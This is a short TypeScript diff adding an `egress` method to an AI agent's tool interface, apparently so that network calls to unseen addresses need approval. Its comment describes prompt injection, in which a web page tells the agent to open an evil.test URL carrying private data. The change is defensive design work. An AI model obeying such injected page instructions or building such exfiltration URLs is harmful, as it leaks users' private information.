@@ -495,6 +495,13 @@ export interface Tool<A = unknown> {
    * notes and can be undone. MCP tools never set it.
    */
   trustFrom?: Exclude<TrustLevel, 'ask'>;
+  /**
+   * The addresses one call would contact, for a tool that reaches out to the network. In a task
+   * that read untrusted content, an address nobody has shown the task (the person did not type
+   * it and no tool result listed it) needs approval, because a page can tell Remy to open
+   * `https://evil.test/?q=<something private>` and a read needs no card.
+   */
+  egress?(args: A): string[];
   effect: Effect;
   outputTrust: Trust;
   timeoutMs: number;
